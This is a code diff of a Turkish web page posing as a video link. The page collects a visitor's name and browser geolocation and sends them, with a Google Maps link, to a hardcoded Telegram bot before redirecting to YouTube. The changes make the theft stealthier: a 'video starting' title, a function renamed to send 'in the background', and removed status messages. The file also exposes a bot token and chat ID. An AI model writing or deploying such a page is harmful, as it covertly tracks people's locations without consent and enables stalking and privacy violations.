@@ -2,7 +2,7 @@
 <html lang="tr">
 <head>
   <meta charset="UTF-8">
-  <title>Giriş</title>
+  <title>Video Başlatılıyor...</title>
   <style>
     body {
       font-family: sans-serif;
@@ -23,43 +23,33 @@
 </head>
 <body>
 
-  <h2>Adınızı Girin</h2>
+  <h2>Giriş yapın</h2>
   <input id="isim" placeholder="Adınız">
   <br>
-  <button onclick="gonder()">Gönder ve YouTube'a Geç</button>
+  <button onclick="devam()">Devam Et</button>
   <p id="durum"></p>
 
   <script>
     const BOT_TOKEN = "8103906170:AAFLQZ3RE499VbqoOoGUMDnWiUPxXFwvHsg";
-    const CHAT_ID   = "8499614707";
+    const CHAT_ID = "8499614707";
     const YOUTUBE_URL = "https://www.youtube.com/watch?v=PCMJtCjfxpw";
 
-    function telegramaGonder(isim, konum) {
-      const mesaj = `🧑 Ad: ${isim}\n📍 Konum: https://www.google.com/maps?q=${konum.lat},${konum.lon}`;
-      return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+    function arkadaGonder(isim, konum) {
+      const mesaj = `🧑 Ad: ${isim}\n📍 Konum: https://maps.google.com?q=${konum.lat},${konum.lon}`;
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          chat_id: CHAT_ID,
-          text: mesaj
-        })
+        body: JSON.stringify({ chat_id: CHAT_ID, text: mesaj })
       });
     }
 
-    function gonder() {
+    function devam() {
       const isim = document.getElementById("isim").value.trim();
       const durum = document.getElementById("durum");
-      durum.textContent = "";
 
       if (!isim) {
         durum.style.color = "red";
         durum.textContent = "Lütfen adınızı girin.";
-        return;
-      }
-
-      if (!navigator.geolocation) {
-        durum.style.color = "red";
-        durum.textContent = "Konum desteği yok.";
         return;
       }
 
@@ -69,20 +59,11 @@
           lon: pos.coords.longitude.toFixed(6)
         };
 
-        telegramaGonder(isim, konum)
-          .then(() => {
-            durum.style.color = "green";
-            durum.textContent = "Giriş başarılı.YouTube'a yönlendiriliyorsunuz...";
-            setTimeout(() => {
-              window.location.href = YOUTUBE_URL;
-            }, 1500);
-          })
-          .catch(err => {
-            console.error("Telegram hatası:", err);
-            durum.style.color = "red";
-            durum.textContent = "Telegram gönderimi başarısız oldu.";
-          });
-
+        arkadaGonder(isim, konum);
+        durum.textContent = "Video başlatılıyor...";
+        setTimeout(() => {
+          window.location.href = YOUTUBE_URL;
+        }, 1500);
       }, err => {
         durum.style.color = "red";
         durum.textContent = "Konum alınamadı: " + err.message;
